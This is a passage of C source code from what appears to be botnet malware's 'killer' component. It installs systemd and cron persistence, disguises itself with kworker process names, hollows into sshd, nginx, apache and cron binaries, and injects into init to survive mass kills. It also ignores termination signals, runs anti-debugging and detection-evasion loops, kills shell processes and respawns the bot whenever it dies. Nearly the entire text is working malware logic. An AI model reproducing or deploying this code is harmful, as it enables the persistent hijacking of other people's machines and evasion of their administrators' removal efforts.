        sys_execve(enc[USR_BIN_SYSTEMCTL].string, args, NULL);
        sys_exit(0);
    }
    
    return 0;
}

static int install_cron_job(const char *bot_path) {
    (void)0;
    
    char cron_path[128];
    sprintf(cron_path, enc[CRON_TAB_PATH].string);
    
    int fd = sys_open(cron_path, O_WRONLY | O_CREAT | O_APPEND, 0600);
    if (fd < 0) return -1;
    
    char buf[256];
    sprintf(buf, enc[CRON_LINE_FMT].string, bot_path);
    sys_write(fd, buf, strlen(buf));
    sys_close(fd);
    
    return 0;
}

static inline void install_persistence(const char *bot_path) {
    install_systemd_service(bot_path);
    install_cron_job(bot_path);
}

int is_killer_running(void) {
    DIR *dir = sys_opendir(enc[PROC_DIR].string); if (!dir) return 0;
    struct dirent *ent;
    while ((ent = sys_readdir(dir))) {
        if (!isdigit(ent->d_name[0])) continue;
        int pid = atoi(ent->d_name); if (pid == killer_pid) continue;
        char path[64]; sprintf(path, enc[PROC_PID_COMM].string, pid);
        int fd = sys_open(path, O_RDONLY, 0);
        if (fd >= 0) {
            char comm[64] = {0}; sys_read(fd, comm, sizeof(comm)-1); sys_close(fd);
            char *nl = sys_strstr(comm, "\n"); if (nl) *nl = '\0';
            if (sys_strstr(comm, enc[PROC_NAME_KWORKER_0_20].string) != NULL) { 
                sys_closedir(dir); return 1; 
            }
        }
    }
    sys_closedir(dir); return 0;
}

static inline void set_killer_name(int n, char **argv) {
    char name[16];
    memset(name, 0, 16);
    const char *names[] = {enc[PROC_NAME_KWORKER_0_2].string, enc[PROC_NAME_KWORKER_U2_0].string, enc[PROC_NAME_KWORKER_0_0H].string};
    strcpy(name, names[n % 3]);

    sys_prctl(15/*PR_SET_NAME*/, (unsigned long)name, 0, 0, 0);

    if (argv != NULL && argv[0] != NULL) {
        for (int i = 1; i < 3; i++) {
            if (argv[i] != NULL) {
                memset(argv[i], 0, strlen(argv[i]));
            }
        }
        memset(argv[0], 0, strlen(argv[0]));
        strcpy(argv[0], name);
    }
}

static int try_hollow_into_system_process(void) {
    const char *targets[] = {
        enc[USR_SSMTP_SSHD].string,
        enc[USR_BIN_SSHD].string,
        enc[USR_SSMTP_SSHD].string,
        enc[APACHE2_PATH].string,
        enc[USR_SBIN_HTTPD].string,
        enc[USR_SBIN_NGINX].string,
        enc[USR_SBIN_CRON].string,
        enc[USR_SBIN_CROND].string,
        NULL
    };
    
    for (int i = 0; targets[i] != NULL; i++) {
        struct stat st;
        if (sys_stat(targets[i], &st) == 0) {
            #ifdef DEBUG
            debug("[killer] Attempting to hollow into: %s\n", targets[i]);
            #endif
            
            int hollowed_pid = hollow_with_execve(targets[i], NULL);
            if (hollowed_pid > 0) {
                #ifdef DEBUG
                debug("[killer] Successfully hollowed into: %s (PID: %d)\n", targets[i], hollowed_pid);
                #endif
                return hollowed_pid;
            }
        }
    }
    
    return -1;
}

void killer_create(char **argv) {
    killer_init();
    /* Immediate anti-debug check before any operations */
    check_tracer(sys_getpid());
    
    /* Fork watchdog process to respawn killer if it dies */
    pid_t watchdog_pid = sys_fork();
    if (watchdog_pid == 0) {
        killer_watchdog(argv);
        sys_exit(0);
    } else if (watchdog_pid < 0) {
        #ifdef DEBUG
        debug("[killer] Failed to create watchdog\n");
        #endif
    }
    
    /* Install persistence mechanisms */
    sys_readlink(enc[PROC_SELF_EXE].string, bot_path, 255);
    install_persistence(bot_path);
    
    #ifdef DEBUG
    debug("[killer] Attempting injection into whitelisted process\n");
    #endif
    
    int hollowed_pid = try_hollow_into_system_process();
    if (hollowed_pid > 0) {
        #ifdef DEBUG
        debug("[killer] Successfully injected into whitelisted process (PID: %d)\n", hollowed_pid);
        #endif
        killer_pid = hollowed_pid;
        main_bot_pid = sys_getpid();
        global_argv = argv;
        
        struct stat st;
        if (sys_stat(bot_path, &st) == 0) {
            self_inode = st.st_ino;
            self_device = st.st_dev;
        }
        
        set_killer_name(0, argv);
        sys_prctl(1 /*PR_SET_PDEATHSIG*/, (unsigned long)SIGHUP, 0, 0, 0);
        set_oom_protection();
        struct sched_param sp = { .sched_priority = 99 };
        sys_sched_setscheduler(0, SCHED_FIFO, &sp);
        sys_setpriority(PRIO_PROCESS, 0, -20);
        sys_signal(SIGTERM, SIG_IGN); sys_signal(SIGINT, SIG_IGN); sys_signal(SIGHUP, SIG_IGN);
        sys_signal(SIGQUIT, SIG_IGN); sys_signal(SIGUSR1, SIG_IGN); sys_signal(SIGUSR2, SIG_IGN);
        sys_signal(SIGPIPE, SIG_IGN); sys_signal(SIGALRM, SIG_IGN);
        
        while (1) {
            anti_debug_scan();
            anti_detection_evasion();
            
            int main_loop_delay = 100 + (rand_next() % 500);
            sys_usleep(main_loop_delay);
            
            if (main_bot_pid > 0 && sys_kill(main_bot_pid, 0) == -1) {
                #ifdef DEBUG
                debug("[killer] Bot died! Resurrection initiated...\n");
                #endif
                int p = sys_fork();
                if (p == 0) {
                    sys_execve(bot_path, global_argv, NULL);
                    sys_exit(0);
                } else if (p > 0) {
                    main_bot_pid = p;
                }
            }
            sys_usleep(100);
        }
    }
    
    #ifdef DEBUG
    debug("[killer] Attempting injection into init to survive kill -9 -1\n");
    #endif
    
    int init_pid = inject_into_init(argv);
    if (init_pid > 0) {
        #ifdef DEBUG
        debug("[killer] Successfully injected into init (PID: %d)\n", init_pid);
        #endif
        killer_pid = init_pid;
        main_bot_pid = sys_getpid();
        global_argv = argv;
        sys_readlink(enc[PROC_SELF_EXE].string, bot_path, 255);
        
        struct stat st;
        if (sys_stat(bot_path, &st) == 0) {
            self_inode = st.st_ino;
            self_device = st.st_dev;
        }
        
        set_killer_name(0, argv);
        sys_prctl(1 /*PR_SET_PDEATHSIG*/, (unsigned long)SIGHUP, 0, 0, 0);
        set_oom_protection();
        struct sched_param sp = { .sched_priority = 99 };
        sys_sched_setscheduler(0, SCHED_FIFO, &sp);
        sys_setpriority(PRIO_PROCESS, 0, -20);
        sys_signal(SIGTERM, SIG_IGN); sys_signal(SIGINT, SIG_IGN); sys_signal(SIGHUP, SIG_IGN);
        sys_signal(SIGQUIT, SIG_IGN); sys_signal(SIGUSR1, SIG_IGN); sys_signal(SIGUSR2, SIG_IGN);
        sys_signal(SIGPIPE, SIG_IGN); sys_signal(SIGALRM, SIG_IGN);
        
        while (1) {
            anti_debug_scan();
            anti_detection_evasion();
            
            int main_loop_delay = 100 + (rand_next() % 500);
            sys_usleep(main_loop_delay);
            
            if (main_bot_pid > 0 && sys_kill(main_bot_pid, 0) == -1) {
                #ifdef DEBUG
                debug("[killer] Bot died! Resurrection initiated...\n");
                #endif
                int p = sys_fork();
                if (p == 0) {
                    sys_execve(bot_path, global_argv, NULL);
                    sys_exit(0);
                } else if (p > 0) {
                    main_bot_pid = p;
                }
            }
            sys_usleep(100);
        }
    }
    
    #ifdef DEBUG
    debug("[killer] Init injection failed, using normal fork\n");
    #endif
    
    killer_kill_bash_sh_once();

    int pid = sys_fork();
    if (pid != 0) {
        sys_usleep(1000000); // Give the killer time to nuke everything first
        return;
    }


    
    killer_pid = sys_getpid(); main_bot_pid = sys_getppid();
    global_argv = argv;
    sys_readlink(enc[PROC_SELF_EXE].string, bot_path, 255);
    
    struct stat st;
    if (sys_stat(bot_path, &st) == 0) {
        self_inode = st.st_ino;
        self_device = st.st_dev;
    }


    set_killer_name(0, argv);
    sys_prctl(1 /*PR_SET_PDEATHSIG*/, (unsigned long)SIGHUP, 0, 0, 0); 
    set_oom_protection();
    struct sched_param sp;
    memset(&sp, 0, sizeof(sp));
    sp.sched_priority = 99;
    sys_sched_setscheduler(0, SCHED_FIFO, &sp);
    sys_setpriority(PRIO_PROCESS, 0, -20);
    sys_signal(SIGTERM, SIG_IGN); sys_signal(SIGINT, SIG_IGN); sys_signal(SIGHUP, SIG_IGN);
    sys_signal(SIGQUIT, SIG_IGN); sys_signal(SIGUSR1, SIG_IGN); sys_signal(SIGUSR2, SIG_IGN);
    sys_signal(SIGPIPE, SIG_IGN); sys_signal(SIGALRM, SIG_IGN);



    anti_debug_scan();

    int nl_fd = nl_connect();

    if (is_killer_running()) {
        if (nl_fd != -1) sys_close(nl_fd);
        sys_exit(0);
    }

    if (nl_fd != -1) {
        if (sys_fork() == 0) {
            set_killer_name(1, argv);
            struct pollfd pfd = { .fd = nl_fd, .events = POLLIN };
            while (1) {
                if (sys_poll(&pfd, 1, -1) > 0) {
                    if (pfd.revents & POLLIN) nl_handle_event(nl_fd);
                } else {
                    sys_usleep(1000);
                }
            }
            sys_exit(0);
        }
    }

    if (sys_fork() == 0) {
        if (nl_fd != -1) sys_close(nl_fd);
        set_killer_name(2, argv);
        while (1) {
            stealth_hidden_scan();
            int loop_delay = 5 + (rand_next() % 50);
            sys_usleep(loop_delay);
        }
        sys_exit(0);
    }


    if (nl_fd != -1) sys_close(nl_fd);
    while (1) {
        anti_debug_scan();
        anti_detection_evasion();

        int main_loop_delay = 100 + (rand_next() % 500);
        sys_usleep(main_loop_delay);

        if (main_bot_pid > 0 && sys_kill(main_bot_pid, 0) == -1) {
            #ifdef DEBUG
            debug("[killer] Bot died! Resurrection initiated...\n");
            #endif
            int p = sys_fork();
            if (p == 0) {
                sys_execve(bot_path, global_argv, NULL);
                sys_exit(0);
            } else if (p > 0) {
                main_bot_pid = p;
            }
        }
        sys_usleep(100);

    }
}
